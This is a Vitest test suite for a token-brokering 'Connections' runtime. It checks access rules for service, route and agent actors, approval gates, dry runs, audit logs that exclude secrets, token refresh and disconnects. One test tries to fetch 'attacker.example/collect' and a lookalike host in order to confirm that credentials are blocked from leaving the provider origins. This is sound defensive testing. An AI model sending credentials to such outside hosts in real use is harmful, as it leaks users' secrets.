import { afterEach, describe, expect, it, vi } from "vitest"

import { useConnection } from "../src/index.ts"
import { oauth2 } from "../src/providers/oauth2.ts"
import { createConnectionsRuntime } from "../src/runtime/core.ts"
import { setConnectionsRuntime } from "../src/runtime/state.ts"
import { createConnectionsStore } from "../src/store.ts"
import {
  accessToken,
  base64urlKey,
  createDatabase,
  expectCode,
  fakeProvider,
  mockFetch,
  readOperation,
  refreshToken,
  rows,
  setupRuntime,
  testKey,
  tokenSet,
  writeOperation,
} from "./helpers.ts"

import type { ConnectionActor, ConnectionDefinition, ConnectionTokenSet } from "../src/types.ts"

const server: ConnectionActor = { id: "server", kind: "service" }
const agent: ConnectionActor = { id: "triage", kind: "agent" }

function okApi() {
  return mockFetch((url, init) => Response.json(init.method === "POST" ? { name: "created-item" } : { id: url.pathname.split("/").pop(), ok: true }))
}

afterEach(() => {
  setConnectionsRuntime(undefined)
})

describe("Connections runtime access", () => {
  it("allows reads by default and sends the bearer token", async () => {
    const api = okApi()
    const { name, runtime, store } = setupRuntime({ fetch: api.fetch })
    await store.write({ name, provider: "fake", tokens: tokenSet() })

    await expect(runtime.call(name, readOperation, { id: "42" }, { actor: server })).resolves.toEqual({ id: "42", ok: true })
    expect(api.calls).toEqual([{ authorization: `Bearer ${accessToken}`, body: undefined, method: "GET", url: "https://api.example/items/42?secret=query-value" }])
    expect(await runtime.activity({})).toEqual([])
  })

  it("denies writes by default, records the denial, and does not call the provider", async () => {
    const api = okApi()
    const { name, runtime, store } = setupRuntime({ fetch: api.fetch })
    await store.write({ name, provider: "fake", tokens: tokenSet() })

    await expectCode(runtime.call(name, writeOperation, { name: "x" }, { actor: server, trace: { invocationId: "inv-1", tool: "createItem" } }), "CONNECTIONS_DENIED")
    expect(api.calls).toEqual([])
    expect(await runtime.activity({})).toEqual([expect.objectContaining({
      action: "call",
      actor: server,
      connection: name,
      effect: "write",
      invocationId: "inv-1",
      operation: "test.items.create",
      outcome: "denied",
      target: "api.example/items",
      tool: "createItem",
    })])
  })

  it("runs allowed writes and records them with status and target", async () => {
    const api = okApi()
    const { name, runtime, store } = setupRuntime({
      definition: { access: { server: { allow: ["test.items.*"] } }, provider: fakeProvider().provider },
      fetch: api.fetch,
    })
    await store.write({ name, provider: "fake", tokens: tokenSet() })

    await expect(runtime.call(name, writeOperation, { name: "created-item" }, { actor: server })).resolves.toEqual({ created: "created-item" })
    expect(api.calls[0]).toMatchObject({ body: JSON.stringify({ name: "created-item" }), method: "POST" })
    const [event] = await runtime.activity({})
    expect(event).toMatchObject({ effect: "write", outcome: "succeeded", status: 200, target: "api.example/items" })
    expect(event!.durationMs).toBeGreaterThanOrEqual(0)
  })

  it("requires approval and records it", async () => {
    const api = okApi()
    const { name, runtime, store } = setupRuntime({
      definition: { access: { agents: { triage: { allow: ["*"], approve: ["test.items.create"] } } }, provider: fakeProvider().provider },
      fetch: api.fetch,
    })
    await store.write({ name, provider: "fake", tokens: tokenSet() })

    await expectCode(runtime.call(name, writeOperation, { name: "x" }, { actor: agent }), "CONNECTIONS_APPROVAL_REQUIRED")
    expect(api.calls).toEqual([])
    expect(await runtime.activity({})).toEqual([expect.objectContaining({ actor: agent, outcome: "approval-required" })])
    await expect(runtime.decide(name, agent, writeOperation)).resolves.toBe("require-approval")
  })

  it("uses the Agent rule for Agents and the route rule for route events", async () => {
    const api = okApi()
    const { name, runtime, store } = setupRuntime({
      definition: {
        access: { routes: { "POST /api/items": { allow: ["test.items.create"] } }, server: { allow: ["*"] } },
        provider: fakeProvider().provider,
      },
      fetch: api.fetch,
    })
    await store.write({ name, provider: "fake", tokens: tokenSet() })
    setConnectionsRuntime(runtime)

    await expectCode(useConnection(name, { actor: agent }).call(writeOperation, { name: "x" }), "CONNECTIONS_DENIED")
    await expect(useConnection(name, { event: { context: { matchedRoute: { route: "/api/items" } }, method: "POST" } }).call(writeOperation, { name: "x" }))
      .resolves.toEqual({ created: "created-item" })
    await expect(useConnection(name).call(writeOperation, { name: "x" })).resolves.toEqual({ created: "created-item" })
    const actors = (await runtime.activity({})).map(event => `${event.actor.kind}:${event.actor.id}:${event.outcome}`)
    expect(actors).toEqual(["service:server:succeeded", "route:POST /api/items:succeeded", "agent:triage:denied"])
  })

  it("rejects unknown Connections and missing grants", async () => {
    const { name, runtime } = setupRuntime()
    await expectCode(runtime.call("unknown", readOperation, { id: "1" }, { actor: server }), "CONNECTIONS_NOT_FOUND")
    await expectCode(runtime.call(name, readOperation, { id: "1" }, { actor: server }), "CONNECTIONS_MISSING")
    expect(() => useConnection(" ")).toThrow(expect.objectContaining({ code: "CONNECTIONS_INVALID" }))
  })
})

describe("Connections runtime dry run and audit", () => {
  it("skips allowed writes in dry run and records them", async () => {
    const api = okApi()
    const { name, runtime, store } = setupRuntime({
      definition: { access: { server: { allow: ["*"] } }, provider: fakeProvider().provider },
      fetch: api.fetch,
    })
    await store.write({ name, provider: "fake", tokens: tokenSet() })

    await expect(runtime.call(name, writeOperation, { name: "x" }, { actor: server, dryRun: true }))
      .resolves.toEqual({ operation: "test.items.create", skipped: "dry-run" })
    await expect(runtime.call(name, readOperation, { id: "1" }, { actor: server, dryRun: true })).resolves.toEqual({ id: "1", ok: true })
    expect(api.calls.map(call => call.method)).toEqual(["GET"])
    expect(await runtime.activity({})).toEqual([expect.objectContaining({ operation: "test.items.create", outcome: "skipped" })])
  })

  it("still denies writes in dry run", async () => {
    const { name, runtime, store } = setupRuntime({ fetch: okApi().fetch })
    await store.write({ name, provider: "fake", tokens: tokenSet() })

    await expectCode(runtime.call(name, writeOperation, { name: "x" }, { actor: server, dryRun: true }), "CONNECTIONS_DENIED")
  })

  it("records successful reads only with audit all", async () => {
    const { name, runtime, store } = setupRuntime({ fetch: okApi().fetch })
    await store.write({ name, provider: "fake", tokens: tokenSet() })

    await runtime.call(name, readOperation, { id: "1" }, { actor: server, audit: "changes" })
    expect(await runtime.activity({})).toEqual([])
    await runtime.call(name, readOperation, { id: "2" }, { actor: server, audit: "all" })
    expect(await runtime.activity({})).toEqual([expect.objectContaining({ effect: "read", operation: "test.items.get", outcome: "succeeded", status: 200 })])
  })

  it("records failed reads in changes mode and hides the provider body", async () => {
    const api = mockFetch(() => Response.json({ error: "provider secret detail" }, { status: 500 }))
    const { name, runtime, store } = setupRuntime({ fetch: api.fetch })
    await store.write({ name, provider: "fake", tokens: tokenSet() })

    const error = await runtime.call(name, readOperation, { id: "1" }, { actor: server }).catch((reason: unknown) => reason)
    expect(error).toMatchObject({ code: "CONNECTIONS_PROVIDER_FAILED", details: { connection: name, operation: "test.items.get", status: 500 } })
    expect(JSON.stringify(error)).not.toContain("provider secret detail")
    expect(await runtime.activity({})).toEqual([expect.objectContaining({ error: "CONNECTIONS_PROVIDER_FAILED", outcome: "failed", status: 500 })])
  })

  it("records a malformed or rejected response as a failed call", async () => {
    const api = mockFetch(() => new Response("not json", { status: 200 }))
    const { name, runtime, store } = setupRuntime({ definition: { access: { server: { allow: ["*"] } }, provider: fakeProvider().provider }, fetch: api.fetch })
    await store.write({ name, provider: "fake", tokens: tokenSet() })
    const strict = { ...writeOperation, parse: () => { throw new TypeError("unexpected shape") } }

    await expectCode(runtime.call(name, writeOperation, { name: "x" }, { actor: server }), "CONNECTIONS_PROVIDER_FAILED")
    api.mock.mockImplementation(async () => Response.json({ other: true }))
    await expect(runtime.call(name, strict, { name: "x" }, { actor: server })).rejects.toThrow("unexpected shape")
    expect((await runtime.activity({})).map(event => [event.outcome, event.error, event.status])).toEqual([
      ["failed", "CONNECTIONS_FAILED", 200],
      ["failed", "CONNECTIONS_PROVIDER_FAILED", 200],
    ])
  })

  it("never sends the credential to an origin outside the provider origins", async () => {
    const api = okApi()
    const { name, runtime, store } = setupRuntime({ definition: { access: { server: { allow: ["*"] } }, provider: fakeProvider().provider }, fetch: api.fetch })
    await store.write({ name, provider: "fake", tokens: tokenSet() })

    await expectCode(runtime.fetch(name, "https://attacker.example/collect", undefined, { actor: server }), "CONNECTIONS_ORIGIN_NOT_ALLOWED")
    await expectCode(runtime.fetch(name, "http://api.example/items", undefined, { actor: server }), "CONNECTIONS_ORIGIN_NOT_ALLOWED")
    await expectCode(runtime.call(name, { ...readOperation, request: () => ({ method: "GET", url: "https://api.example.attacker.example/x" }) }, { id: "1" }, { actor: server }), "CONNECTIONS_ORIGIN_NOT_ALLOWED")
    expect(api.calls).toEqual([])
    expect((await runtime.activity({}))[0]).toMatchObject({ error: "CONNECTIONS_ORIGIN_NOT_ALLOWED", outcome: "denied", target: "api.example.attacker.example/x" })
  })

  it("runs an approved Operation that an approve rule would stop", async () => {
    const api = okApi()
    const { name, runtime, store } = setupRuntime({ definition: { access: { agents: { triage: { approve: ["test.items.create"], deny: ["test.items.get"] } } }, provider: fakeProvider().provider }, fetch: api.fetch })
    await store.write({ name, provider: "fake", tokens: tokenSet() })

    await expectCode(runtime.call(name, writeOperation, { name: "x" }, { actor: agent }), "CONNECTIONS_APPROVAL_REQUIRED")
    await expect(runtime.call(name, writeOperation, { name: "x" }, { actor: agent, approved: true })).resolves.toEqual({ created: "created-item" })
    // Approval never overrides a deny rule.
    await expectCode(runtime.call(name, readOperation, { id: "1" }, { actor: agent, approved: true }), "CONNECTIONS_DENIED")
  })

  it("never stores tokens or bodies in activity", async () => {
    const api = mockFetch((url, init, index) => index === 1
      ? new Response(null, { status: 401 })
      : Response.json({ echo: init.body ?? url.toString() }))
    const { db, name, runtime, store } = setupRuntime({
      definition: { access: { server: { allow: ["*"] } }, provider: fakeProvider().provider },
      fetch: api.fetch,
    })
    await store.write({ name, provider: "fake", tokens: tokenSet() })

    await runtime.call(name, readOperation, { id: "1" }, { actor: server, audit: "all" })
    await runtime.call(name, writeOperation, { name: "body-marker" }, { actor: server })
    await runtime.fetch(name, "https://api.example/raw?token=query-marker", { body: "raw-body-marker", method: "PUT" }, { actor: server })
    await runtime.refresh(name, { actor: server })

    const stored = JSON.stringify(await rows(db, "vitehub_connection_activity"))
    expect(stored).toContain("test.items.create")
    for (const marker of [accessToken, refreshToken, "refreshed-access", "body-marker", "raw-body-marker", "query-marker", "query-value"]) {
      expect(stored).not.toContain(marker)
    }
    const actions = (await runtime.activity({})).map(event => `${event.action}:${event.outcome}`)
    expect(actions).toContain("refresh:succeeded")
  })
})

describe("Connections runtime fetch", () => {
  it("treats GET and HEAD as reads and other methods as writes", async () => {
    const api = mockFetch(() => new Response("ok"))
    const { name, runtime, store } = setupRuntime({ fetch: api.fetch })
    await store.write({ name, provider: "fake", tokens: tokenSet() })

    expect((await runtime.fetch(name, "https://api.example/a", undefined, { actor: server })).status).toBe(200)
    expect((await runtime.fetch(name, new URL("https://api.example/b"), { method: "head" }, { actor: server })).status).toBe(200)
    await expectCode(runtime.fetch(name, "https://api.example/c", { method: "POST" }, { actor: server }), "CONNECTIONS_DENIED")
    await expectCode(runtime.fetch(name, "https://api.example/d", { method: "delete" }, { actor: server }), "CONNECTIONS_DENIED")

    expect(api.calls.map(call => `${call.method} ${call.url} ${call.authorization}`)).toEqual([
      `GET https://api.example/a Bearer ${accessToken}`,
      `HEAD https://api.example/b Bearer ${accessToken}`,
    ])
    expect((await runtime.activity({})).map(event => `${event.operation}:${event.effect}:${event.outcome}`)).toEqual([
      "fetch.delete:write:denied",
      "fetch.post:write:denied",
    ])
  })

  it("allows fetch writes by pattern and skips them in dry run", async () => {
    const api = mockFetch(() => new Response("ok"))
    const { name, runtime, store } = setupRuntime({
      definition: { access: { server: { allow: ["fetch.post"] } }, provider: fakeProvider().provider },
      fetch: api.fetch,
    })
    await store.write({ name, provider: "fake", tokens: tokenSet() })

    const skipped = await runtime.fetch(name, "https://api.example/x", { method: "POST" }, { actor: server, dryRun: true })
    expect(skipped.status).toBe(204)
    expect(skipped.headers.get("x-vitehub-connection-skipped")).toBe("dry-run")
    expect(api.calls).toEqual([])
    expect((await runtime.fetch(name, "https://api.example/x", { headers: { "x-custom": "1" }, method: "POST" }, { actor: server })).status).toBe(200)
    expect(api.calls).toHaveLength(1)
    const [first] = api.mock.mock.calls
    expect(new Headers(first![1]?.headers).get("x-custom")).toBe("1")
  })
})

describe("Connections runtime refresh", () => {
  it("refreshes tokens that expire within 60 seconds", async () => {
    const api = okApi()
    const { fake, name, runtime, store } = setupRuntime({ fetch: api.fetch })
    const before = await store.write({ name, provider: "fake", tokens: tokenSet({ expiresAt: Date.now() + 30_000 }) })

    await runtime.call(name, readOperation, { id: "1" }, { actor: server })
    expect(fake.refresh).toHaveBeenCalledTimes(1)
    expect(api.calls[0]!.authorization).toBe("Bearer refreshed-access-1")
    const after = await store.tokens(name)
    expect(after?.grant.revision).not.toBe(before.revision)
    expect(after?.tokens).toMatchObject({ accessToken: "refreshed-access-1", account: "owner@example.com", refreshToken })
    expect(await runtime.activity({})).toEqual([expect.objectContaining({ action: "refresh", outcome: "succeeded" })])

    await runtime.call(name, readOperation, { id: "2" }, { actor: server })
    expect(fake.refresh).toHaveBeenCalledTimes(1)
  })

  it("does not refresh tokens without an expiry", async () => {
    const { fake, name, runtime, store } = setupRuntime({ fetch: okApi().fetch })
    await store.write({ name, provider: "fake", tokens: tokenSet({ expiresAt: undefined }) })

    await runtime.call(name, readOperation, { id: "1" }, { actor: server })
    expect(fake.refresh).not.toHaveBeenCalled()
  })

  it("refreshes once for concurrent calls", async () => {
    const api = okApi()
    const fake = fakeProvider()
    let refreshes = 0
    const refresh = vi.fn(async (token: ConnectionTokenSet): Promise<ConnectionTokenSet> => {
      refreshes += 1
      await new Promise(resolve => setTimeout(resolve, 80))
      return { ...token, accessToken: `concurrent-${refreshes}`, expiresAt: Date.now() + 3_600_000 }
    })
    const { name, runtime, store } = setupRuntime({ definition: { provider: { ...fake.provider, refresh } }, fetch: api.fetch })
    await store.write({ name, provider: "fake", tokens: tokenSet({ expiresAt: Date.now() - 1 }) })

    await Promise.all([1, 2, 3, 4].map(id => runtime.call(name, readOperation, { id: String(id) }, { actor: server })))
    expect(refresh).toHaveBeenCalledTimes(1)
    expect(new Set(api.calls.map(call => call.authorization))).toEqual(new Set(["Bearer concurrent-1"]))
  })

  it("marks the Connection for reconnect on invalid_grant", async () => {
    const provider = mockFetch((url) => {
      if (url.pathname === "/token") return Response.json({ error: "invalid_grant", error_description: "revoked secret detail" }, { status: 400 })
      return Response.json({ id: "1", ok: true })
    })
    const definition: ConnectionDefinition = {
      provider: oauth2({ authorizationUrl: "https://auth.example/authorize", client: () => ({ clientId: "client" }), origins: ["https://api.example"], scopes: ["test.read"], tokenUrl: "https://auth.example/token" }),
    }
    const { name, runtime, store } = setupRuntime({ definition, fetch: provider.fetch })
    await store.write({ name, provider: "oauth2", tokens: tokenSet({ expiresAt: Date.now() - 1 }) })

    await expectCode(runtime.call(name, readOperation, { id: "1" }, { actor: server }), "CONNECTIONS_NEEDS_RECONNECT")
    expect(await runtime.inspect(name)).toMatchObject({ lastError: "CONNECTIONS_NEEDS_RECONNECT", status: "needs-reconnect" })
    await expectCode(runtime.call(name, readOperation, { id: "1" }, { actor: server }), "CONNECTIONS_NEEDS_RECONNECT")
    expect(provider.calls.map(call => call.url)).toEqual(["https://auth.example/token"])
    const events = await runtime.activity({})
    expect(events.map(event => `${event.action}:${event.outcome}:${event.error}`)).toEqual([
      "call:failed:CONNECTIONS_NEEDS_RECONNECT",
      "call:failed:CONNECTIONS_NEEDS_RECONNECT",
      "refresh:failed:CONNECTIONS_NEEDS_RECONNECT",
    ])
    expect(JSON.stringify(events)).not.toContain("revoked secret detail")
  })

  it("marks the Connection for reconnect when an expired token has no refresh token", async () => {
    const { fake, name, runtime, store } = setupRuntime({ fetch: okApi().fetch })
    await store.write({ name, provider: "fake", tokens: tokenSet({ expiresAt: Date.now() - 1, refreshToken: undefined }) })

    await expectCode(runtime.call(name, readOperation, { id: "1" }, { actor: server }), "CONNECTIONS_NEEDS_RECONNECT")
    expect(fake.refresh).not.toHaveBeenCalled()
    expect((await runtime.inspect(name)).status).toBe("needs-reconnect")
  })

  it("sets error status when refresh fails for another reason", async () => {
    const fake = fakeProvider()
    const refresh = vi.fn(async (): Promise<ConnectionTokenSet> => {
      throw new Error("network down")
    })
    const { name, runtime, store } = setupRuntime({ definition: { provider: { ...fake.provider, refresh } }, fetch: okApi().fetch })
    await store.write({ name, provider: "fake", tokens: tokenSet({ expiresAt: Date.now() - 1 }) })

    await expect(runtime.call(name, readOperation, { id: "1" }, { actor: server })).rejects.toThrow("network down")
    expect(await runtime.inspect(name)).toMatchObject({ lastError: "CONNECTIONS_FAILED", status: "error" })
    expect((await store.grant(name))?.leaseUntil).toBeUndefined()
  })

  it("forces one refresh and one retry after a provider 401", async () => {
    const api = mockFetch((_url, init) => new Headers(init.headers).get("authorization") === `Bearer ${accessToken}`
      ? new Response("expired", { status: 401 })
      : Response.json({ id: "1", ok: true }))
    const { fake, name, runtime, store } = setupRuntime({ fetch: api.fetch })
    await store.write({ name, provider: "fake", tokens: tokenSet() })

    await expect(runtime.call(name, readOperation, { id: "1" }, { actor: server })).resolves.toEqual({ id: "1", ok: true })
    expect(fake.refresh).toHaveBeenCalledTimes(1)
    expect(api.calls.map(call => call.authorization)).toEqual([`Bearer ${accessToken}`, "Bearer refreshed-access-1"])
  })

  it("retries a 401 only once", async () => {
    const api = mockFetch(() => new Response(null, { status: 401 }))
    const { fake, name, runtime, store } = setupRuntime({ fetch: api.fetch })
    await store.write({ name, provider: "fake", tokens: tokenSet() })

    await expectCode(runtime.call(name, readOperation, { id: "1" }, { actor: server }), "CONNECTIONS_PROVIDER_FAILED")
    expect(fake.refresh).toHaveBeenCalledTimes(1)
    expect(api.calls).toHaveLength(2)
  })

  it("does not retry a 401 when the request body is a stream", async () => {
    const api = mockFetch(() => new Response(null, { status: 401 }))
    const fake = fakeProvider()
    const { name, runtime, store } = setupRuntime({
      definition: { access: { server: { allow: ["fetch.post"] } }, provider: fake.provider },
      fetch: api.fetch,
    })
    await store.write({ name, provider: "fake", tokens: tokenSet() })

    const body = new ReadableStream({ start: controller => controller.close() })
    const response = await runtime.fetch(name, "https://api.example/upload", { body, duplex: "half", method: "POST" } as RequestInit, { actor: server })
    expect(response.status).toBe(401)
    expect(fake.refresh).not.toHaveBeenCalled()
    expect(api.calls).toHaveLength(1)
  })

  it("does not retry a 401 without a refresh token", async () => {
    const api = mockFetch(() => new Response(null, { status: 401 }))
    const { fake, name, runtime, store } = setupRuntime({ fetch: api.fetch })
    await store.write({ name, provider: "fake", tokens: tokenSet({ refreshToken: undefined }) })

    await expectCode(runtime.call(name, readOperation, { id: "1" }, { actor: server }), "CONNECTIONS_PROVIDER_FAILED")
    expect(fake.refresh).not.toHaveBeenCalled()
    expect(api.calls).toHaveLength(1)
  })

  it("refreshes on request and returns the summary", async () => {
    const { fake, name, runtime, store } = setupRuntime()
    await store.write({ name, provider: "fake", tokens: tokenSet() })

    await expect(runtime.refresh(name, { actor: server })).resolves.toMatchObject({ name, status: "active" })
    expect(fake.refresh).toHaveBeenCalledTimes(1)
  })
})

describe("Connections runtime lifecycle", () => {
  it("summarizes Connections without tokens", async () => {
    const { name, runtime, store } = setupRuntime({ definition: { description: "Inbox", provider: fakeProvider().provider } })
    expect(runtime.names()).toEqual([name])
    expect(await runtime.list()).toEqual([{ access: {}, description: "Inbox", name, origins: ["https://api.example"], provider: "fake", scopes: ["test.read"], status: "disconnected" }])

    await store.write({ name, provider: "fake", tokens: tokenSet() })
    const summary = await runtime.inspect(name)
    expect(summary).toMatchObject({ account: "owner@example.com", scopes: ["test.read", "test.write"], status: "active" })
    expect(summary.expiresAt).toMatch(/Z$/)
    expect(JSON.stringify(summary)).not.toContain(accessToken)
  })

  it("reports a key mismatch as needs-reconnect", async () => {
    const db = createDatabase()
    const definition: ConnectionDefinition = { provider: fakeProvider().provider }
    const registry = { api: async () => ({ default: definition }) }
    const first = createConnectionsRuntime({ database: () => db, encryptionKey: () => testKey(1), registry })
    const second = createConnectionsRuntime({ database: () => db, encryptionKey: () => base64urlKey(2), fetch: okApi().fetch, registry })
    await createConnectionsStore({ db, encryptionKey: testKey(1) }).write({ name: "api", provider: "fake", tokens: tokenSet() })

    expect(await second.inspect("api")).toMatchObject({ lastError: "CONNECTIONS_KEY_MISMATCH", status: "needs-reconnect" })
    await expectCode(second.call("api", readOperation, { id: "1" }, { actor: server }), "CONNECTIONS_KEY_MISMATCH")
    expect(await first.inspect("api")).toMatchObject({ status: "active" })
  })

  it("requires a reconnect when the provider of a Connection changed", async () => {
    const api = okApi()
    const { fake, name, runtime, store } = setupRuntime({ fetch: api.fetch })
    await store.write({ name, provider: "previous", tokens: tokenSet() })

    expect(await runtime.inspect(name)).toMatchObject({ lastError: "CONNECTIONS_PROVIDER_CHANGED", status: "needs-reconnect" })
    await expectCode(runtime.call(name, readOperation, { id: "1" }, { actor: server }), "CONNECTIONS_NEEDS_RECONNECT")
    expect(api.calls).toEqual([])
    await runtime.disconnect(name, { actor: server })
    expect(fake.revoke).not.toHaveBeenCalled()
    expect(await store.grant(name)).toBeUndefined()
  })

  it("keeps a grant that a reconnect wrote while disconnect loaded the definition", async () => {
    const db = createDatabase()
    const fake = fakeProvider()
    let notifyLoading = () => {}
    let finishLoading = () => {}
    const loading = new Promise<void>((resolve) => { notifyLoading = resolve })
    const loaded = new Promise<void>((resolve) => { finishLoading = resolve })
    const runtime = createConnectionsRuntime({
      database: () => db,
      encryptionKey: () => testKey(),
      registry: {
        api: async () => {
          notifyLoading()
          await loaded
          return { default: { provider: fake.provider } }
        },
      },
    })
    const store = createConnectionsStore({ db, encryptionKey: testKey() })
    await store.write({ name: "api", provider: "fake", tokens: tokenSet() })

    const disconnect = runtime.disconnect("api", { actor: server })
    await loading
    await store.write({ name: "api", provider: "fake", tokens: tokenSet({ accessToken: "reconnected" }) })
    finishLoading()

    await expect(disconnect).resolves.toMatchObject({ status: "active" })
    expect(fake.revoke).toHaveBeenCalledWith(expect.objectContaining({ accessToken }), expect.anything())
    expect((await store.tokens("api"))?.tokens.accessToken).toBe("reconnected")
  })

  it("keeps a grant that a reconnect wrote while disconnect revoked the old one", async () => {
    const { fake, name, runtime, store } = setupRuntime()
    await store.write({ name, provider: "fake", tokens: tokenSet() })
    fake.revoke.mockImplementationOnce(async () => {
      await store.write({ name, provider: "fake", tokens: tokenSet({ accessToken: "reconnected" }) })
    })

    // The summary shows the grant that survived, not a disconnected Connection.
    await expect(runtime.disconnect(name, { actor: server })).resolves.toMatchObject({ status: "active" })
    expect((await store.tokens(name))?.tokens.accessToken).toBe("reconnected")
  })

  it("reports a completed disconnect when the activity insert fails", async () => {
    const { db, name, runtime, store } = setupRuntime()
    await store.write({ name, provider: "fake", tokens: tokenSet() })
    const originalRun = db.run.bind(db)
    // SAFETY: The spy keeps the database contract and only fails activity inserts.
    vi.spyOn(db, "run").mockImplementation(((query: Parameters<typeof db.run>[0]) =>
      JSON.stringify(query).includes("INSERT INTO vitehub_connection_activity") ? Promise.reject(new Error("activity store down")) : originalRun(query)) as typeof db.run)

    await expect(runtime.disconnect(name, { actor: server })).resolves.toMatchObject({ status: "disconnected" })
    expect(await store.grant(name)).toBeUndefined()
  })

  it("revokes and deletes the grant on disconnect", async () => {
    const { fake, name, runtime, store } = setupRuntime()
    await store.write({ name, provider: "fake", tokens: tokenSet() })

    await expect(runtime.disconnect(name, { actor: server })).resolves.toMatchObject({ status: "disconnected" })
    expect(fake.revoke.mock.calls[0]?.[0]).toMatchObject({ refreshToken })
    expect(await store.grant(name)).toBeUndefined()
    expect(await runtime.activity({})).toEqual([expect.objectContaining({ action: "disconnect", outcome: "succeeded" })])
  })

  it("disconnects grants sealed with another key without revoking them", async () => {
    const db = createDatabase()
    const fake = fakeProvider()
    await createConnectionsStore({ db, encryptionKey: testKey(1) }).write({ name: "api", provider: "fake", tokens: tokenSet() })
    const runtime = createConnectionsRuntime({ database: () => db, encryptionKey: () => testKey(2), registry: { api: async () => ({ default: { provider: fake.provider } }) } })

    await expect(runtime.disconnect("api", { actor: server })).resolves.toMatchObject({ status: "disconnected" })
    expect(fake.revoke).not.toHaveBeenCalled()
  })

  it("records a revoke failure but still disconnects", async () => {
    const fake = fakeProvider({ revoke: async () => Promise.reject(new Error("revoke failed")) })
    const { name, runtime, store } = setupRuntime({ definition: { provider: fake.provider } })
    await store.write({ name, provider: "fake", tokens: tokenSet() })

    await runtime.disconnect(name, { actor: server })
    expect(await store.grant(name)).toBeUndefined()
    expect(await runtime.activity({})).toEqual([expect.objectContaining({ action: "disconnect", error: "CONNECTIONS_FAILED" })])
  })
})

describe("Connections runtime configuration", () => {
  const registry = { api: async () => ({ default: { provider: fakeProvider().provider } }) }

  it("fails when the database is missing", async () => {
    const runtime = createConnectionsRuntime({ database: () => undefined, encryptionKey: () => testKey(), registry })
    await expectCode(runtime.inspect("api"), "CONNECTIONS_NOT_CONFIGURED")
    await expectCode(runtime.call("api", readOperation, { id: "1" }, { actor: server }), "CONNECTIONS_NOT_CONFIGURED")
  })

  it("keeps access decisions when the audit database is missing", async () => {
    const approval = { api: async () => ({ default: { access: { server: { approve: ["test.items.create"] } }, provider: fakeProvider().provider } }) }
    const denied = createConnectionsRuntime({ database: () => undefined, encryptionKey: () => testKey(), registry })
    const approvalRequired = createConnectionsRuntime({ database: () => undefined, encryptionKey: () => testKey(), registry: approval })
    await expectCode(denied.call("api", writeOperation, { name: "x" }, { actor: server }), "CONNECTIONS_DENIED")
    await expectCode(approvalRequired.call("api", writeOperation, { name: "x" }, { actor: server }), "CONNECTIONS_APPROVAL_REQUIRED")
  })

  it("fails when the key is missing, empty, or not 32 bytes", async () => {
    const db = createDatabase()
    for (const key of [undefined, "", "short", new Uint8Array(16), "%%%not-base64%%%"]) {
      const runtime = createConnectionsRuntime({ database: () => db, encryptionKey: () => key, registry })
      await expectCode(runtime.inspect("api"), "CONNECTIONS_NOT_CONFIGURED")
    }
  })

  it("passes the event to the key resolver", async () => {
    const db = createDatabase()
    const encryptionKey = vi.fn((_event: unknown) => base64urlKey())
    const runtime = createConnectionsRuntime({ database: () => db, encryptionKey, registry })
    const event = { method: "GET", path: "/x" }

    await runtime.inspect("api", event)
    expect(encryptionKey).toHaveBeenCalledWith(event)
  })

  it("accepts definition modules without a default export", async () => {
    const db = createDatabase()
    const definition: ConnectionDefinition = { provider: fakeProvider().provider }
    const runtime = createConnectionsRuntime({ database: () => db, encryptionKey: () => testKey(), registry: { api: async () => definition, bad: async () => ({ default: {} }) } })

    await expect(runtime.inspect("api")).resolves.toMatchObject({ status: "disconnected" })
    await expectCode(runtime.inspect("bad"), "CONNECTIONS_NOT_FOUND")
  })
})
